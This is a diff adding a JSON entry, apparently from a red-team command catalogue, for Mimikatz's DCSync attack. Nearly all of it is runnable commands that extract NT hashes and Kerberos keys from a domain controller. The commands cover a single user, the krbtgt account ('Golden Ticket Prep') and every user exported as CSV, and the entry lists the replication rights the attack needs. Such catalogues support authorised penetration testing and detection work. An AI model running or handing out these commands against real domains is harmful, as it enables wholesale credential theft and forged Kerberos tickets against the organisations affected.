@@ -1,0 +1,17 @@
+{
+  "id": "mimikatz-dcsync",
+  "name": "Mimikatz lsadump::dcsync",
+  "command": "mimikatz.exe \"lsadump::dcsync /domain:<domain> /user:<target-user>\" exit",
+  "description": "Pull a single user's NT hash and Kerberos keys directly from a DC via the MS-DRSR replication protocol. No code runs on the DC. Requires DCSync rights (DA, EA, or explicit Replicating Directory Changes / Replicating Directory Changes All).",
+  "platform": "windows",
+  "requires": ["shell"],
+  "protocols": ["kerberos", "rpc"],
+  "tags": ["mimikatz", "dcsync", "drsuapi"],
+  "variations": [
+    { "label": "krbtgt (Golden Ticket Prep)", "requires": "shell", "command": "mimikatz.exe \"lsadump::dcsync /domain:<domain> /user:krbtgt\" exit" },
+    { "label": "All Users", "requires": "shell", "command": "mimikatz.exe \"lsadump::dcsync /domain:<domain> /all /csv\" exit" }
+  ],
+  "examples": [
+    "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit"
+  ]
+}
